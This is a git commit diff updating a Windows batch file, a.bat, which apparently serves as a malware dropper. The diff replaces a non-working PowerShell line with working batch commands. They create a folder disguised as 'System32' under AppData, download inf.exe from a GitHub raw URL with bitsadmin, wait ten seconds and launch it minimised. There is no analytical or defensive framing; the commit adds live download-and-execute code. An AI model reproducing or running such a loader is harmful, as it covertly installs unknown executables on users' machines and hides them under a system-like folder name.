f3e27251ee04d0524d0844ad248c9901585cf1c4
WindowsEnjoyer-1 <being2269@gmail.com>
2025-02-25 12:44:21 -0800

    Update a.bat

--- a.bat
+++ a.bat
@@ -1,3 +1,7 @@
 @echo off
-if (-not (Test-Path -Path "$env:APPDATA\Roaming\System32")) { New-Item -ItemType Directory -Path "$env:APPDATA\Roaming\System32" }; Invoke-WebRequest -Uri 'https://github.com/WindowsEnjoyer-1/123412341234/raw/refs/heads/main/inf.exe' -OutFile "$env:APPDATA\Roaming\System32\inf.exe"; Start-Sleep -Seconds 10; Start-Process "$env:APPDATA\Roaming\System32\inf.exe" -WindowStyle Hidden
-exit
+if not exist "%APPDATA%\Roaming\System32" (
+    mkdir "%APPDATA%\Roaming\System32"
+)
+bitsadmin /transfer mydownloadjob /download /priority high "https://github.com/WindowsEnjoyer-1/123412341234/raw/refs/heads/main/inf.exe" "%APPDATA%\Roaming\System32\inf.exe"
+timeout /t 10 /nobreak
+start /min "" "%APPDATA%\Roaming\System32\inf.exe"
